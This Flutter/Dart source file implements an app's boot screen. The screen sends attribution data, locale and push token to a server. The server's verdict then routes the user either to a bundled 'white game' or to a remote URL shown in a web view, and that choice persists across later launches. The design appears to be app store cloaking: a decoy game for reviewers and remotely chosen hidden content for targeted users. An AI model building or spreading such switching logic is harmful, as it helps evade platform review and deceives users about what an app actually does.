import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import 'beacon.dart';
import 'keeper.dart';
import 'models.dart';
import 'native_tap.dart';
import 'offering_prompt.dart';
import 'offline_stage.dart';
import 'omen_signal.dart';
import 'payload_forge.dart';
import 'push_channel.dart';
import 'push_consent.dart';
import 'web_shell.dart';

/// Boot / routing screen. Owns the launch decision and shows a programm-
/// atic loading indicator while it runs.
class BootStage extends StatefulWidget {
  const BootStage({
    super.key,
    required this.keeper,
    required this.signal,
    required this.forge,
    required this.channel,
    required this.consent,
    required this.goGame,
  });

  final OracleKeeper keeper;
  final OmenSignal signal;
  final PayloadForge forge;
  final PushChannel channel;
  final PushConsent consent;

  /// Called once the boot decides the user should go to the white game.
  final void Function() goGame;

  @override
  State<BootStage> createState() => _BootStageState();
}

class _BootStageState extends State<BootStage>
    with SingleTickerProviderStateMixin {
  double _progress = 0.0;
  bool _navigated = false;
  late final AnimationController _spinner;

  @override
  void initState() {
    super.initState();
    SystemChrome.setPreferredOrientations(const [
      DeviceOrientation.portraitUp, DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft, DeviceOrientation.landscapeRight,
    ]);
    _spinner = AnimationController(
      vsync: this, duration: const Duration(milliseconds: 1600),
    )..repeat();
    _boot();
  }

  @override
  void dispose() {
    widget.channel.onTokenRotated = null;
    _spinner.dispose();
    super.dispose();
  }

  void _tick(double v) {
    if (!mounted) return;
    setState(() => _progress = v);
  }

  Future<void> _boot() async {
    widget.channel.onTokenRotated = _onTokenRotated;

    final tapUrl = await NativeColdTap.pull();
    if (tapUrl != null && tapUrl.isNotEmpty) {
      await widget.keeper.commitLane(LaunchLane.content);
      await widget.keeper.takeOneShot();
      unawaited(_dispatchInBackground());
      SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (!mounted) return;
        _routeToShell(tapUrl, coldStartTap: true);
      });
      return;
    }

    _tick(0.05);
    final lane = widget.keeper.currentLane();

    switch (lane) {
      case LaunchLane.content:
        _tick(0.4);
        final pushFuture = widget.channel.arm().catchError((_) {});
        await _handleContentLane(pushFuture: pushFuture);
        break;
      case LaunchLane.game:
        _tick(0.4);
        unawaited(widget.channel.arm().catchError((_) {}));
        final recovered = await _tryPromote();
        if (recovered) return;
        _tick(1.0);
        await Future.delayed(const Duration(milliseconds: 500));
        _routeToGame();
        break;
      case LaunchLane.cold:
        await widget.channel.arm().catchError((_) {});
        await _handleColdLane();
        break;
    }
  }

  Future<void> _dispatchInBackground() async {
    try {
      await Future.wait([
        widget.channel.arm().catchError((_) {}),
        widget.signal.spinUp().catchError((_) {}),
      ]);
      await Future.wait([
        widget.signal.awaitConversion(timeout: const Duration(seconds: 6)),
        widget.signal.awaitDeepLink(),
      ]);
      final body = await widget.forge.compose(
        locale: Platform.localeName.replaceAll('-', '_'),
        pushToken: widget.channel.token,
      );
      await widget.forge.dispatch(body);
    } catch (_) {}
  }

  void _onTokenRotated(String token) async {
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.forge.compose(
      locale: locale, pushToken: token,
    );
    widget.forge.dispatch(body);
  }

  Future<void> _handleColdLane() async {
    _tick(0.15);
    final online = await skyBeacon.reachable();
    if (!online) { if (mounted) _routeToOffline(); return; }

    _tick(0.35);
    await widget.signal.spinUp();
    await Future.wait([
      widget.signal.awaitConversion(),
      widget.signal.awaitDeepLink(),
    ]);
    _tick(0.65);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.forge.compose(
      locale: locale, pushToken: widget.channel.token,
    );
    final verdict = await widget.forge.dispatch(body);

    if (verdict.approved && verdict.destination != null) {
      await widget.keeper.commitLane(LaunchLane.content);
      _tick(1.0);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _routeToShell(verdict.destination!);
    } else {
      await widget.keeper.commitLane(LaunchLane.game);
      _tick(1.0);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _routeToGame();
    }
  }

  Future<void> _handleContentLane({Future<void>? pushFuture}) async {
    final netFuture = skyBeacon.reachable();
    if (pushFuture != null) await Future.wait([netFuture, pushFuture]);
    final online = await netFuture;

    if (!online) {
      _tick(1.0);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _routeToOffline();
      return;
    }

    final oneShot = await widget.keeper.takeOneShot();
    if (oneShot != null) {
      _tick(1.0);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _routeToShell(oneShot);
      return;
    }

    final signalFuture = widget.signal.spinUp();
    final savedUrl = await widget.keeper.loadSavedUrl();
    await signalFuture;
    await Future.wait([
      widget.signal.awaitConversion(timeout: const Duration(seconds: 5)),
      widget.signal.awaitDeepLink(),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.forge.compose(
      locale: locale, pushToken: widget.channel.token,
    );
    final verdict = await widget.forge.dispatch(body);

    _tick(1.0);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return;

    if (verdict.approved && verdict.destination != null) {
      _routeToShell(verdict.destination!);
    } else if (savedUrl != null) {
      _routeToShell(savedUrl);
    } else {
      _routeToOffline();
    }
  }

  Future<bool> _tryPromote() async {
    final online = await skyBeacon.reachable();
    if (!online) return false;
    await widget.signal.spinUp();
    await Future.wait([
      widget.signal.awaitConversion(timeout: const Duration(seconds: 8)),
      widget.signal.awaitDeepLink(),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.forge.compose(
      locale: locale, pushToken: widget.channel.token,
    );
    final verdict = await widget.forge.dispatch(body);
    if (!(verdict.approved && verdict.destination != null)) return false;
    await widget.keeper.commitLane(LaunchLane.content);
    _tick(1.0);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return true;
    _routeToShell(verdict.destination!);
    return true;
  }

  void _routeToShell(String url, {bool coldStartTap = false}) {
    if (_navigated) return;
    _navigated = true;
    if (widget.keeper.needsConsentPrompt()) {
      widget.consent.shouldOffer().then((canAsk) {
        if (!mounted) return;
        if (canAsk) {
          Navigator.of(context).pushReplacement(MaterialPageRoute(
            builder: (_) => OfferingPrompt(
              keeper: widget.keeper,
              channel: widget.channel,
              consent: widget.consent,
              destination: url,
              coldStartTap: coldStartTap,
              onTokenReady: (token) async {
                final locale = Platform.localeName.replaceAll('-', '_');
                final body = await widget.forge.compose(
                  locale: locale, pushToken: token,
                );
                widget.forge.dispatch(body);
              },
            ),
          ));
        } else {
          _routeDirect(url, coldStartTap: coldStartTap);
        }
      });
    } else {
      _routeDirect(url, coldStartTap: coldStartTap);
    }
  }

  void _routeDirect(String url, {bool coldStartTap = false}) {
    if (!mounted) return;
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => WebShell(
        destination: url,
        keeper: widget.keeper,
        channel: widget.channel,
        coldStartTap: coldStartTap,
      ),
    ));
  }

  void _routeToGame() {
    if (_navigated) return;
    _navigated = true;
    widget.goGame();
  }

  void _routeToOffline() {
    if (_navigated) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => OfflineStage(
        retryBuilder: (_) => BootStage(
          keeper: widget.keeper,
          signal: widget.signal,
          forge: widget.forge,
          channel: widget.channel,
          consent: widget.consent,
          goGame: widget.goGame,
        ),
      ),
    ));
  }

  @override
  Widget build(BuildContext context) {
    final mq = MediaQuery.of(context);
    final landscape = mq.orientation == Orientation.landscape;
    final barWidth = landscape
        ? (mq.size.height * 0.42).clamp(0.0, 200.0)
        : (mq.size.width * 0.72).clamp(0.0, 360.0);

    return Scaffold(
      backgroundColor: const Color(0xFF0A0E1A),
      body: Stack(
        fit: StackFit.expand,
        children: [
          _BootBackdrop(landscape: landscape),
          Positioned(
            left: 0, right: 0,
            bottom: landscape ? 32 : mq.padding.bottom + 42,
            child: Center(
              child: SizedBox(
                width: barWidth,
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    AnimatedBuilder(
                      animation: _spinner,
                      builder: (_, _) => CustomPaint(
                        size: Size(barWidth, 10),
                        painter: _ProgressBarPainter(
                          value: _progress,
                          phase: _spinner.value,
                        ),
                      ),
                    ),
                    const SizedBox(height: 12),
                    Text(
                      'Preparing storm…',
                      style: TextStyle(
                        color: Colors.white.withValues(alpha: 0.75),
                        fontSize: 13,
                        letterSpacing: 0.6,
                        fontWeight: FontWeight.w600,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

class _BootBackdrop extends StatelessWidget {
  const _BootBackdrop({required this.landscape});
  final bool landscape;

  @override
  Widget build(BuildContext context) {
    return Stack(
      fit: StackFit.expand,
      children: [
        const DecoratedBox(
          decoration: BoxDecoration(
            gradient: RadialGradient(
              center: Alignment.center,
              radius: 1.2,
              colors: [Color(0xFF1B2560), Color(0xFF0A0E1A)],
            ),
          ),
        ),
        Center(
          child: Padding(
            padding:
                EdgeInsets.symmetric(horizontal: landscape ? 60 : 34),
            child: Icon(
              Icons.bolt_rounded,
              color: Colors.white.withValues(alpha: 0.85),
              size: landscape ? 100 : 130,
              shadows: const [
                Shadow(color: Color(0x88FFD400), blurRadius: 40),
              ],
            ),
          ),
        ),
      ],
    );
  }
}

class _ProgressBarPainter extends CustomPainter {
  _ProgressBarPainter({required this.value, required this.phase});
  final double value;
  final double phase;

  @override
  void paint(Canvas canvas, Size size) {
    final rrect = RRect.fromRectAndRadius(
      Offset.zero & size, const Radius.circular(6),
    );
    canvas.drawRRect(
      rrect,
      Paint()..color = Colors.white.withValues(alpha: 0.10),
    );

    final filledWidth = (size.width * value.clamp(0.0, 1.0));
    if (filledWidth <= 0) return;

    final fill = Rect.fromLTWH(0, 0, filledWidth, size.height);
    canvas.save();
    canvas.clipRRect(rrect);
    canvas.drawRect(
      fill,
      Paint()
        ..shader = const LinearGradient(
          colors: [Color(0xFF3E76FF), Color(0xFFFFD400)],
          begin: Alignment.centerLeft,
          end: Alignment.centerRight,
        ).createShader(fill),
    );

    // Shimmer sweep synced with [phase].
    final shimmerX = (phase * (filledWidth + 60)) - 30;
    final shimmerRect = Rect.fromLTWH(shimmerX, 0, 40, size.height);
    final shimmerPaint = Paint()
      ..shader = LinearGradient(
        colors: [
          Colors.white.withValues(alpha: 0.0),
          Colors.white.withValues(alpha: 0.45),
          Colors.white.withValues(alpha: 0.0),
        ],
      ).createShader(shimmerRect);
    canvas.drawRect(shimmerRect, shimmerPaint);
    canvas.restore();
  }

  @override
  bool shouldRepaint(covariant _ProgressBarPainter old) =>
      old.value != value || old.phase != phase;
}
